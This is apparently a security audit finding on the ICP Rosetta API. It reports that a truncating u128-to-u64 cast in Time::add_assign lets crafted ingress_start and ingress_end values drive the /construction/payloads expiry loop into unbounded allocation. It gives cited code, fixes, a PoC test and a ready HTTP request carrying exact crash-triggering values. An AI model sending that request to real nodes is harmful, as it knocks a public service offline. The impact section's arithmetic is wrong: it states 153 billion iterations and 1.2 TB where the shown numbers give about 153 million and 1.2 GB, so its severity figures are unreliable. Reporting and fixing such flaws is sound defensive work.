### Title
Unbounded Loop via `Time::add_assign` u128→u64 Truncation in `construction_payloads` Ingress Expiry Loop — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

---

### Summary

An unauthenticated HTTP client can supply crafted `metadata.ingress_start` / `metadata.ingress_end` values to the Rosetta `/construction/payloads` endpoint that cause `Time::add_assign` to silently wrap `now` back to zero via a truncating `u128 as u64` cast, making the termination condition `now < ingress_end` permanently true and driving the `ingress_expiries` `Vec` to exhaust process memory (OOM crash).

---

### Finding Description

**The loop** at `construction_payloads.rs` lines 99–107:

```rust
let mut now = ingress_start;
while now < ingress_end {
    ingress_expiries.push(...);
    now += interval;          // ← Time::add_assign
}
``` [1](#0-0) 

`interval` is computed as:

```
MAX_INGRESS_TTL(300s) − PERMITTED_DRIFT(60s) − 120s = 120s = 120_000_000_000 ns
``` [2](#0-1) [3](#0-2) 

**`Time::add_assign`** delegates to `Time::from_duration`:

```rust
fn add_assign(&mut self, other: Duration) {
    *self = Time::from_duration(Duration::from_nanos(self.0) + other)
}
fn from_duration(t: Duration) -> Self {
    Time(t.as_nanos() as u64)   // ← truncating cast, no overflow check
}
``` [4](#0-3) [5](#0-4) 

`Duration::as_nanos()` returns `u128`. When the sum exceeds `u64::MAX`, the `as u64` cast silently truncates (wraps), producing a small value.

**`ingress_start` and `ingress_end` are taken directly from the request with no bounds validation:**

```rust
let ingress_start = meta.as_ref()
    .and_then(|meta| meta.ingress_start)
    .map(ic_types::time::Time::from_nanos_since_unix_epoch)
    .unwrap_or_else(ic_types::time::current_time);

let ingress_end = meta.as_ref()
    .and_then(|meta| meta.ingress_end)
    .map(ic_types::time::Time::from_nanos_since_unix_epoch)
    .unwrap_or_else(|| ingress_start + interval);
``` [6](#0-5) 

`Time::from_nanos_since_unix_epoch` is a bare `Time(nanos)` constructor — no range check. [7](#0-6) 

---

### Impact Explanation

**Trigger values:**
- `ingress_start = u64::MAX − 120_000_000_000 + 1 = 18_446_744_073_589_551_616`
- `ingress_end   = u64::MAX                       = 18_446_744_073_709_551_615`

**Iteration 1:**
- `now (18_446_744_073_589_551_616) < ingress_end` → **true**, push entry
- `now += interval`: `Duration(18_446_744_073_589_551_616 ns) + Duration(120_000_000_000 ns)` = `18_446_744_073_709_551_616` as u128; `as u64` → **0** (wraps)

**Iteration 2 onward:**
- `now = 0 < u64::MAX` → **true**; increments by 120 s each time
- Loop runs ≈ `u64::MAX / 120_000_000_000 ≈ 153 billion` more iterations
- Each iteration pushes a `u64` (8 bytes) onto `ingress_expiries`; total allocation ≈ **1.2 TB** → process OOM / crash

The Rosetta node is a public HTTP service; `/construction/payloads` requires no authentication. A single malformed request crashes the node.

---

### Likelihood Explanation

- The endpoint is reachable by any unauthenticated HTTP client.
- The metadata fields are optional JSON integers; no schema-level constraint prevents near-`u64::MAX` values.
- No server-side guard exists between JSON deserialization and the loop.
- The exploit is deterministic and reproducible with a single HTTP request.

---

### Recommendation

1. **Replace the truncating cast** in `Time::from_duration` with a checked or saturating conversion, or make it return `Option<Time>` / panic in debug builds.
2. **Add an upper-bound guard** before the loop, e.g.:

```rust
if ingress_end > ingress_start + interval * MAX_REASONABLE_EXPIRIES {
    return Err(ApiError::invalid_request("ingress window too large"));
}
```

3. **Use `Time::checked_add`** (already exists in `time.rs` lines 122–128) instead of `+=` in the loop body. [8](#0-7) 

---

### Proof of Concept

```rust
// Pseudocode unit test (no network required)
let interval_ns: u64 = 120_000_000_000;
let ingress_start = u64::MAX - interval_ns + 1;
let ingress_end   = u64::MAX;

let mut count = 0usize;
let mut now = Time::from_nanos_since_unix_epoch(ingress_start);
let end     = Time::from_nanos_since_unix_epoch(ingress_end);
let dur     = Duration::from_nanos(interval_ns);

while now < end {
    count += 1;
    assert!(count <= 2, "loop did not terminate: count={}", count);
    now += dur;  // wraps to 0 on first iteration with current code
}
// With current code this assertion fires at count=3 (now=0 < u64::MAX forever)
```

HTTP trigger:
```json
POST /construction/payloads
{
  "network_identifier": {...},
  "operations": [...],
  "public_keys": [...],
  "metadata": {
    "ingress_start": 18446744073589551616,
    "ingress_end":   18446744073709551615
  }
}
```

### Citations

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L59-60)
```rust
        let interval =
            ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L74-84)
```rust
        let ingress_start = meta
            .as_ref()
            .and_then(|meta| meta.ingress_start)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(ic_types::time::current_time);

        let ingress_end = meta
            .as_ref()
            .and_then(|meta| meta.ingress_end)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| ingress_start + interval);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L99-107)
```rust
        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```

**File:** rs/limits/src/lib.rs (L17-21)
```rust
pub const MAX_INGRESS_TTL: Duration = Duration::from_secs(5 * 60); // 5 minutes

/// Duration subtracted from `MAX_INGRESS_TTL` by
/// `expiry_time_from_now()` when creating an ingress message.
pub const PERMITTED_DRIFT: Duration = Duration::from_secs(60);
```

**File:** rs/types/types/src/time.rs (L55-59)
```rust
impl std::ops::AddAssign<Duration> for Time {
    fn add_assign(&mut self, other: Duration) {
        *self = Time::from_duration(Duration::from_nanos(self.0) + other)
    }
}
```

**File:** rs/types/types/src/time.rs (L67-69)
```rust
    pub const fn from_nanos_since_unix_epoch(nanos: u64) -> Self {
        Time(nanos)
    }
```

**File:** rs/types/types/src/time.rs (L103-105)
```rust
    fn from_duration(t: Duration) -> Self {
        Time(t.as_nanos() as u64)
    }
```

**File:** rs/types/types/src/time.rs (L122-128)
```rust
    pub fn checked_add(self, rhs: Duration) -> Option<Time> {
        if let Ok(rhs_nanos) = u64::try_from(rhs.as_nanos()) {
            Some(Time(self.0.checked_add(rhs_nanos)?))
        } else {
            None
        }
    }
```
